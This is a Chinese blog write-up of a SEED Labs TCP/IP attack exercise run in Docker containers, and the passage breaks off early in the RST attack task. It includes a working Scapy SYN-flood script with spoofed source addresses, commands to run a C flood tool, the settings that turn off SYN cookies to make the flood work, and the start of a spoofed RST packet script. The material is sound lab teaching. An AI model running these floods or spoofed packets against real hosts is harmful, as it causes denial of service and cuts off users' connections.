<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>TCP/IP攻击 - Lane-诶嘿! Welcome~~</title><meta name=author content="Lane Gong"><meta name=author-link content="https://github.com/LaneGong"><meta name=description content="SeedLab网络实验TCP/IP攻击过程记录整理，还有待进一步补充，存疑之处欢迎指正和探讨！"><meta name=keywords content="网络安全攻防实验,Wireshark"><meta itemprop=name content="TCP/IP攻击"><meta itemprop=description content="SeedLab网络实验TCP/IP攻击过程记录整理，还有待进一步补充，存疑之处欢迎指正和探讨！"><meta itemprop=datePublished content="2022-12-12T13:35:15+08:00"><meta itemprop=dateModified content="2022-12-12T13:35:15+08:00"><meta itemprop=wordCount content="5244"><meta itemprop=image content="http://lanegong.top/logo.png"><meta itemprop=keywords content="网络安全攻防实验,Wireshark,"><meta property="og:title" content="TCP/IP攻击"><meta property="og:description" content="SeedLab网络实验TCP/IP攻击过程记录整理，还有待进一步补充，存疑之处欢迎指正和探讨！"><meta property="og:type" content="article"><meta property="og:url" content="http://lanegong.top/posts/tcp-ip-attack/"><meta property="og:image" content="http://lanegong.top/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-12-12T13:35:15+08:00"><meta property="article:modified_time" content="2022-12-12T13:35:15+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://lanegong.top/logo.png"><meta name=twitter:title content="TCP/IP攻击"><meta name=twitter:description content="SeedLab网络实验TCP/IP攻击过程记录整理，还有待进一步补充，存疑之处欢迎指正和探讨！"><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=http://lanegong.top/posts/tcp-ip-attack/><link rel=prev href=http://lanegong.top/posts/warmup-writeup/><link rel=next href=http://lanegong.top/posts/secret-key-encryption/><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"TCP/IP攻击","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/lanegong.top\/posts\/tcp-ip-attack\/"},"genre":"posts","keywords":"网络安全攻防实验, Wireshark","wordcount":5244,"url":"http:\/\/lanegong.top\/posts\/tcp-ip-attack\/","datePublished":"2022-12-12T13:35:15+08:00","dateModified":"2022-12-12T13:35:15+08:00","publisher":{"@type":"Organization","name":"Lane","logo":{"@type":"ImageObject","url":"http:\/\/lanegong.top\/images\/avatar.jpeg","width":690,"height":684}},"author":{"@type":"Person","name":"Lane Gong"},"description":""}</script></head><body data-header-desktop=sticky data-header-mobile=auto><script>(window.localStorage?.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("data-theme","dark")</script><div class=wrapper><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Lane-诶嘿! Welcome~~"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/avatar.jpeg data-srcset="/images/avatar.jpeg, /images/avatar.jpeg 1.5x, /images/avatar.jpeg 2x" data-sizes=auto alt="Lane-诶嘿! Welcome~~" title="Lane-诶嘿! Welcome~~" width=690 height=684><span class=header-title-text>Lane の Blog</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class="menu-item has-children"><a class=menu-link href=/posts/ title=查看所有文章><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden=true></i><ul class=sub-menu><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li></ul></li><li class=menu-item><a class=menu-link href=/friends/ title=友情链接><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/fun/ title=正在开发中...><i class="fa-solid fa-fan fa-fw fa-sm" aria-hidden=true></i> 趣味</a></li><li class=menu-item><a class=menu-link href=/guides/ title=常用站点指南><i class="fa-solid fa-subway fa-fw fa-sm" aria-hidden=true></i> 站点导航</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder="搜索文章标题或内容 ..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Lane-诶嘿! Welcome~~"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/avatar.jpeg data-srcset="/images/avatar.jpeg, /images/avatar.jpeg 1.5x, /images/avatar.jpeg 2x" data-sizes=auto alt=/images/avatar.jpeg title=/images/avatar.jpeg width=690 height=684><span class=header-title-text>Lane の Blog</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="搜索文章标题或内容 ..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></li><li class=menu-item><span class=nested-item><a class=menu-link href=/posts/ title=查看所有文章><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a>
<i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden=true></i></span><ul class=sub-menu><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li></ul></li><li class=menu-item><a class=menu-link href=/friends/ title=友情链接><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/fun/ title=正在开发中...><i class="fa-solid fa-fan fa-fw fa-sm" aria-hidden=true></i> 趣味</a></li><li class=menu-item><a class=menu-link href=/guides/ title=常用站点指南><i class="fa-solid fa-subway fa-fw fa-sm" aria-hidden=true></i> 站点导航</a></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=container data-page-style=normal><aside class=toc id=toc-auto><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside><aside class=aside-custom></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>TCP/IP攻击</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://github.com/LaneGong title=作者 target=_blank rel="external nofollow noopener noreferrer author" class=author><img class="lazyload avatar" src=/svg/loading.min.svg data-src=/images/avatar.jpeg data-srcset="/images/avatar.jpeg, /images/avatar.jpeg 1.5x, /images/avatar.jpeg 2x" data-sizes=auto alt="Lane Gong" title="Lane Gong" width=690 height=684>&nbsp;Lane Gong</a></span>
<span class=post-category>收录于 <a href=/categories/seedlab/><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> SeedLab</a></span></div><div class=post-meta-line><span title="2022-12-12 13:35:15"><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2022-12-12>2022-12-12</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden=true></i> 约 5244 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden=true></i> 预计阅读 11 分钟</span>&nbsp;<span id=busuanzi_container_page_pv class="busuanzi_visitors comment-visitors" data-flag-title=TCP/IP攻击>
<i class="fa-regular fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span id=busuanzi_value_page_pv>-</span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#启动docker实验环境>启动docker实验环境</a><ul><li><a href=#验证>验证</a></li></ul></li><li><a href=#task1-syn-flooding-attack>Task1: SYN Flooding Attack</a><ul><li><a href=#前置说明>前置说明</a><ul><li><a href=#检查半连接队列大小和队列状态>检查半连接队列大小和队列状态</a></li><li><a href=#防御措施syn-cookie>防御措施：SYN Cookie</a></li></ul></li><li><a href=#使用python发起攻击>使用python发起攻击</a><ul><li><a href=#排查过程>排查过程</a></li><li><a href=#攻击失败原因探索及成功率比较>攻击失败原因探索及成功率比较</a></li></ul></li><li><a href=#使用c语言发起攻击>使用C语言发起攻击</a><ul><li><a href=#编译运行>编译运行</a></li><li><a href=#攻击效果>攻击效果</a></li></ul></li><li><a href=#两种攻击方式的比较>两种攻击方式的比较</a></li><li><a href=#开启syn-cookie策略>开启SYN Cookie策略</a></li></ul></li><li><a href=#task-2-tcp-rst-attacks-on-telnet-connections>Task 2: TCP RST Attacks on telnet Connections</a><ul><li><a href=#手动攻击>手动攻击</a></li><li><a href=#自动攻击>自动攻击</a></li></ul></li><li><a href=#task-3-tcp-session-hijacking>Task 3: TCP Session Hijacking</a><ul><li><a href=#手动攻击-1>手动攻击</a><ul><li><a href=#补充1>补充1</a></li><li><a href=#补充2>补充2</a></li></ul></li><li><a href=#自动攻击-1>自动攻击</a></li></ul></li><li><a href=#task-4-creating-reverse-shell-using-tcp-session-hijacking>Task 4: Creating Reverse Shell using TCP Session Hijacking</a><ul><li><a href=#验证reverse-shell>验证Reverse Shell</a></li><li><a href=#通过会话劫持获取reverse-shell>通过会话劫持获取Reverse Shell</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>SeedLab网络实验TCP/IP攻击过程记录整理，还有待进一步补充，存疑之处欢迎指正和探讨！</p><blockquote><p>实验来源：<a href=https://github.com/seed-labs/seed-labs target=_blank rel="external nofollow noopener noreferrer">seed-labs</a></p><p>实验环境：<a href=https://github.com/seed-labs/seed-labs/blob/master/manuals/vm/seedvm-manual.md target=_blank rel="external nofollow noopener noreferrer">配置指南</a></p></blockquote><h2 id=启动docker实验环境>启动docker实验环境</h2><blockquote><p>注意以下叙述区分虚拟机和容器的区别，是在虚拟机上拉取的docker镜像。</p></blockquote><ul><li><p><code>cd Labsetup</code></p></li><li><p><code>docker-compose up -d</code></p></li><li><p><code>docker ps --format "{{ .ID }} {{ .Names }}"</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp0.png data-srcset="/images/tcp0.png, /images/tcp0.png 1.5x, /images/tcp0.png 2x" data-sizes=auto alt=/images/tcp0.png title=/images/tcp0.png width=870 height=163></p></li><li><p>给容器开一个shell，<code>docker exec -it &lt;id> /bin/bash</code></p><blockquote><p>If a docker command requires a container ID, you do not need to type the entire ID string. Typing the first few characters will be sufficient, as long as they are unique among all the containers.</p></blockquote><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp1.png data-srcset="/images/tcp1.png, /images/tcp1.png 1.5x, /images/tcp1.png 2x" data-sizes=auto alt=/images/tcp1.png title=/images/tcp1.png width=861 height=56></p></li><li><p>exit退出</p></li></ul><h3 id=验证>验证</h3><blockquote><p>In this lab, we need to telnet from one containter to another. We have already created an account called seed inside all the containers. Its password is dees. You can telnet into this account.</p></blockquote><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp2.png data-srcset="/images/tcp2.png, /images/tcp2.png 1.5x, /images/tcp2.png 2x" data-sizes=auto alt=/images/tcp2.png title=/images/tcp2.png width=873 height=725></p><h2 id=task1-syn-flooding-attack>Task1: SYN Flooding Attack</h2><h3 id=前置说明>前置说明</h3><h4 id=检查半连接队列大小和队列状态>检查半连接队列大小和队列状态</h4><ul><li><p><code>sysctl net.ipv4.tcp_max_syn_backlog</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp3.png data-srcset="/images/tcp3.png, /images/tcp3.png 1.5x, /images/tcp3.png 2x" data-sizes=auto alt=/images/tcp3.png title=/images/tcp3.png width=868 height=54></p></li><li><p><code>netstat -nat</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp4.png data-srcset="/images/tcp4.png, /images/tcp4.png 1.5x, /images/tcp4.png 2x" data-sizes=auto alt=/images/tcp4.png title=/images/tcp4.png width=866 height=257></p></li></ul><h4 id=防御措施syn-cookie>防御措施：SYN Cookie</h4><blockquote><p>This mechanism is called SYN cookie. It will kick in if the machine detects that it is under the SYN flflood ing attack.By default, Ubuntu’s SYN flflooding countermeasure is turned on.</p></blockquote><p>在构建victim容器时已在docker-compose.yml中将其关闭：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=nt>sysctls</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span>- <span class=l>net.ipv4.tcp_syncookies=0</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>在ubuntu内查看当前状态和开关syncookies的命令(下述-w设置命令需特权权限)：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># sysctl -a | grep syncookies (Display the SYN cookie flag)</span>
</span></span><span class=line><span class=cl><span class=c1># sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)</span>
</span></span><span class=line><span class=cl><span class=c1># sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)</span>
</span></span></code></pre></td></tr></table></div></div><p>实例1:User1无特权</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp5.png data-srcset="/images/tcp5.png, /images/tcp5.png 1.5x, /images/tcp5.png 2x" data-sizes=auto alt=/images/tcp5.png title=/images/tcp5.png width=875 height=73></p><p>实例2:Victim有特权</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp6.png data-srcset="/images/tcp6.png, /images/tcp6.png 1.5x, /images/tcp6.png 2x" data-sizes=auto alt=/images/tcp6.png title=/images/tcp6.png width=868 height=51></p><blockquote><p>查阅了相关资料是说denied是因为要求在sudo也就是root下执行。而我是通过telnet登录seed用户，并不是root。</p></blockquote><p>查阅资料发现可以改变进入容器时的权限，通过-u直接提权：</p><ul><li><p><code>docker exec -it -u root &lt;id> /bin/bash</code></p></li><li><p><code>sysctl -w net.ipv4.tcp_syncookies=1</code>，成功</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp7.png data-srcset="/images/tcp7.png, /images/tcp7.png 1.5x, /images/tcp7.png 2x" data-sizes=auto alt=/images/tcp7.png title=/images/tcp7.png width=872 height=107></p></li><li><p>当然没有特权即时root也不行</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp8.png data-srcset="/images/tcp8.png, /images/tcp8.png 1.5x, /images/tcp8.png 2x" data-sizes=auto alt=/images/tcp8.png title=/images/tcp8.png width=869 height=100></p></li></ul><blockquote><p>其实直接通过<code>docker exec -it &lt;id> /bin/bash</code>也是进入root用户，对docker和实验环境还不够熟悉&mldr;</p></blockquote><h3 id=使用python发起攻击>使用python发起攻击</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=n>IP</span><span class=p>,</span> <span class=n>TCP</span><span class=p>,</span> <span class=n>send</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ipaddress</span> <span class=kn>import</span> <span class=n>IPv4Address</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>getrandbits</span>
</span></span><span class=line><span class=cl><span class=n>ip</span> <span class=o>=</span> <span class=n>IP</span><span class=p>(</span><span class=n>dst</span><span class=o>=</span><span class=s2>&#34;10.9.0.5&#34;</span><span class=p>)</span><span class=c1>#构造一个目的地址为10.9.0.5的IP数据包</span>
</span></span><span class=line><span class=cl><span class=n>tcp</span> <span class=o>=</span> <span class=n>TCP</span><span class=p>(</span><span class=n>dport</span><span class=o>=</span><span class=mi>23</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=s1>&#39;S&#39;</span><span class=p>)</span><span class=c1>#构造目的端口为23的tcp包，标志为S即SYN包</span>
</span></span><span class=line><span class=cl><span class=n>pkt</span> <span class=o>=</span> <span class=n>ip</span><span class=o>/</span><span class=n>tcp</span><span class=c1>#使用/操作符来给数据包加上一层。例如构造一个TCP数据包，在IP层指明数据包的目的地址。在TCP层可以设定数据包的目的端口等等。UDP数据包同理。</span>
</span></span><span class=line><span class=cl><span class=c1>#很多时候一个数据包是由多个协议组成的，组成形式使用/分割，协议顺序由底层逐渐向上，例如构造一个tcp数据包：tcp = Ether()/IP()/TCP()</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>pkt</span><span class=p>[</span><span class=n>IP</span><span class=p>]</span><span class=o>.</span><span class=n>src</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>IPv4Address</span><span class=p>(</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)))</span> <span class=c1>#随机生成source iP</span>
</span></span><span class=line><span class=cl>	<span class=n>pkt</span><span class=p>[</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>sport</span> <span class=o>=</span> <span class=n>getrandbits</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span> <span class=c1>#随机生成source port</span>
</span></span><span class=line><span class=cl>	<span class=n>pkt</span><span class=p>[</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>seq</span> <span class=o>=</span> <span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span> <span class=c1>#随机生成sequence number</span>
</span></span><span class=line><span class=cl>	<span class=n>send</span><span class=p>(</span><span class=n>pkt</span><span class=p>,</span> <span class=n>verbose</span> <span class=o>=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#由于源地址和源端口都是随机的，导致victim在收到syn包后返回的syn/ack包是到一个大概率的不存在的机器上，导致没有ack确认包</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#verbose – set verbosity level,verbose是否显示发包信息</span>
</span></span><span class=line><span class=cl><span class=c1>#当verbose=0表示不显示正在发送的信息</span>
</span></span><span class=line><span class=cl><span class=c1>#当verbose=1表示显示发包信息</span>
</span></span><span class=line><span class=cl><span class=c1>#scapy发送数据包有常用的如下几种方法：</span>
</span></span><span class=line><span class=cl><span class=c1># send(pkt)  发送三层数据包，但不会受到返回的结果。</span>
</span></span><span class=line><span class=cl><span class=c1># sr(pkt)  发送三层数据包，返回两个结果，分别是接收到响应的数据包和未收到响应的数据包。</span>
</span></span><span class=line><span class=cl><span class=c1># sr1(pkt)  发送三层数据包，仅仅返回接收到响应的数据包。</span>
</span></span><span class=line><span class=cl><span class=c1># sendp(pkt)  发送二层数据包。</span>
</span></span><span class=line><span class=cl><span class=c1># srp(pkt)  发送二层数据包，并等待响应。</span>
</span></span><span class=line><span class=cl><span class=c1># srp1(pkt)  发送第二层数据包，并返回响应的数据包</span>
</span></span><span class=line><span class=cl><span class=c1>#层是指工作在第几层，如send()工作在第三层，而sendp()工作在第二层。send()是用来发送IP数据包的，而sendp()是用来发送Ether数据包的。</span>
</span></span><span class=line><span class=cl><span class=c1>#参考：https://www.cnblogs.com/Chinori/p/11560211.html</span>
</span></span><span class=line><span class=cl><span class=c1>#参考：https://blog.csdn.net/dyx0910/article/details/124412639</span>
</span></span></code></pre></td></tr></table></div></div><p>attack:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp9.png data-srcset="/images/tcp9.png, /images/tcp9.png 1.5x, /images/tcp9.png 2x" data-sizes=auto alt=/images/tcp9.png title=/images/tcp9.png width=632 height=46></p><p>victim检查连接数<code>netstat -tna | grep SYN_RECV | wc -l</code>，已经占满了，虽说前面是128但是有四分之一是系统已明确的连接，因此实际空间是小于128的：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp10.png data-srcset="/images/tcp10.png, /images/tcp10.png 1.5x, /images/tcp10.png 2x" data-sizes=auto alt=/images/tcp10.png title=/images/tcp10.png width=786 height=75></p><p>user机尝试连接受害机，仍能连上，攻击失败：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp11.png data-srcset="/images/tcp11.png, /images/tcp11.png 1.5x, /images/tcp11.png 2x" data-sizes=auto alt=image-20221210195523469 title=image-20221210195523469 width=870 height=627></p><h4 id=排查过程>排查过程</h4><p>排查思路主要是按照实验手册所提供的一条条进行尝试：</p><ol><li><p>TCP缓存问题：主要可能是没攻击之前就已经连接过(主要是TCP连接)，所以这台用户机似乎对SYN泛洪免疫，仍能连上 => 本质上是内核缓解机制，就是上面所说的当SYN cookies关闭时系统会与预留四分之一的半连接队伍给proven destination，当这些已连接过的用户机（已经被记住了）再次连接时，直接相当于调用缓存里有的即可(队伍里有它的位置了)，不会造成无空位的情况。</p><p><code>ip tcp_metrics show</code> 发现确实已存在该连接：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp12.png data-srcset="/images/tcp12.png, /images/tcp12.png 1.5x, /images/tcp12.png 2x" data-sizes=auto alt=image-20221210201004314 title=image-20221210201004314 width=875 height=158></p><p><strong>解决办法：</strong> <code>ip tcp_metrics flush</code> 清空，再次攻击，成功！：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp13.png data-srcset="/images/tcp13.png, /images/tcp13.png 1.5x, /images/tcp13.png 2x" data-sizes=auto alt=image-20221210201513021 title=image-20221210201513021 width=861 height=77></p></li></ol><blockquote><p>但是上述攻击成功并不是一直的，有时也会失败。</p></blockquote><h4 id=攻击失败原因探索及成功率比较>攻击失败原因探索及成功率比较</h4><ol><li>TCP重传问题</li><li>队列大小</li></ol><p>待补充&mldr;&mldr;</p><h3 id=使用c语言发起攻击>使用C语言发起攻击</h3><blockquote><p>Other than the TCP cache issue, all the issues mentioned in previous Task can be resolved if we can send spoofed SYN packets fast enough.</p></blockquote><h4 id=编译运行>编译运行</h4><blockquote><p>Before launching the attack, please restore the queue size to its original value.</p></blockquote><ul><li><p>在虚拟机环境下编译<code>gcc -o synflood synflood.c</code>，在进入attack容器攻击</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp14.png data-srcset="/images/tcp14.png, /images/tcp14.png 1.5x, /images/tcp14.png 2x" data-sizes=auto alt=image-20221210202927706 title=image-20221210202927706 width=824 height=79></p></li><li><p><code>synflood 10.9.0.5 23</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp51.png data-srcset="/images/tcp51.png, /images/tcp51.png 1.5x, /images/tcp51.png 2x" data-sizes=auto alt=image-20221210203038311 title=image-20221210203038311 width=688 height=49></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp15.png data-srcset="/images/tcp15.png, /images/tcp15.png 1.5x, /images/tcp15.png 2x" data-sizes=auto alt=image-20221210203103884 title=image-20221210203103884 width=764 height=74></p></li></ul><h4 id=攻击效果>攻击效果</h4><p>使用一台用户机利用telnet命令访问victim，超时 => 已成功。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp16.png data-srcset="/images/tcp16.png, /images/tcp16.png 1.5x, /images/tcp16.png 2x" data-sizes=auto alt=image-20221210203339832 title=image-20221210203339832 width=874 height=102></p><h3 id=两种攻击方式的比较>两种攻击方式的比较</h3><p>待补充&mldr;&mldr;</p><h3 id=开启syn-cookie策略>开启SYN Cookie策略</h3><ol><li><p>victim开启SYN Cookie防御机制：<code>sysctl -w net.ipv4.tcp_syncookies=1</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp17.png data-srcset="/images/tcp17.png, /images/tcp17.png 1.5x, /images/tcp17.png 2x" data-sizes=auto alt=image-20221210203634939 title=image-20221210203634939 width=798 height=74></p></li><li><p>清空TCP缓存，同上。</p></li><li><p>发起c语言攻击，结果如下：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp52.png data-srcset="/images/tcp52.png, /images/tcp52.png 1.5x, /images/tcp52.png 2x" data-sizes=auto alt=image-20221210203817477 title=image-20221210203817477 width=820 height=78></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp18.png data-srcset="/images/tcp18.png, /images/tcp18.png 1.5x, /images/tcp18.png 2x" data-sizes=auto alt=image-20221210203903025 title=image-20221210203903025 width=876 height=549></p><p>成功。防御机制生效了。</p></li><li><p>再清空缓存发起python攻击，结果同上，syn泛洪不起效。</p></li></ol><h2 id=task-2-tcp-rst-attacks-on-telnet-connections>Task 2: TCP RST Attacks on telnet Connections</h2><p>The TCP RST Attack can terminate an established TCP connection between two victims.</p><h3 id=手动攻击>手动攻击</h3><blockquote><p>以victim容器作为服务端，user1作为客户端，虚拟机VM作为攻击主机</p></blockquote><ol><li><p>在虚拟机上打开Wireshark，监听any网卡，filter: telnet</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp19.png data-srcset="/images/tcp19.png, /images/tcp19.png 1.5x, /images/tcp19.png 2x" data-sizes=auto alt=image-20221210233007122 title=image-20221210233007122 width=954 height=448></p></li><li><p>从用户机user1 telnet到victim后随便执行一条命令，如ls，抓victim发往user1的包，注意一定得是找最后一个，这样才能找到正确的下一个序列号。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp20.png data-srcset="/images/tcp20.png, /images/tcp20.png 1.5x, /images/tcp20.png 2x" data-sizes=auto alt=image-20221210233157756 title=image-20221210233157756 width=958 height=563></p></li><li><p>根据截获的源地址、目标地址、端口号以及序列号，构造RST数据包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>ip</span> <span class=o>=</span> <span class=n>IP</span><span class=p>(</span><span class=n>src</span><span class=o>=</span><span class=s2>&#34;10.9.0.5&#34;</span><span class=p>,</span> <span class=n>dst</span><span class=o>=</span><span class=s2>&#34;10.9.0.6&#34;</span><span class=p>)</span>
